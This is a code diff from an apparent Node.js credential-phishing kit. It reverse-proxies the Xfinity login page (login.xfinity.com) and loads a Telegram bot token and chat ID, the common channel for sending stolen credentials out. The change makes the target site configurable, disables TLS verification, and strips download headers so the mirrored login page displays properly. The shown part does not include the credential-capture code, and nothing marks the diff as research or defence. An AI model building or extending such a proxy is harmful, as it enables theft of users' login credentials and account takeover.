@@ -11,16 +11,22 @@ const { createProxyMiddleware, fixRequestBody } = require('http-proxy-middleware
 const TelegramBot = require('node-telegram-bot-api');
 
 
-const proxy = createProxyMiddleware({
-  target: 'https://login.xfinity.com',
-  changeOrigin: true,
-  onProxyReq: fixRequestBody, // This fixes the "download" issue
-});
-
 // 2. Configuration from Environment Variables
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const TARGET_WEBSITE = process.env.TARGET_WEBSITE || 'https://login.xfinity.com';
+
+// 2. Setup the proxy using that variable
+const proxy = createProxyMiddleware({
+  target: TARGET_WEBSITE, // Use the variable here!
+  changeOrigin: true,
+  secure: false,          // Helps with SSL issues on login pages
+  onProxyReq: fixRequestBody,
+  onProxyRes: function (proxyRes, req, res) {
+    // This prevents the "downloading file" issue
+    delete proxyRes.headers['content-disposition'];
+  }
+});
 
 // --- Essential Checks ---
 if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
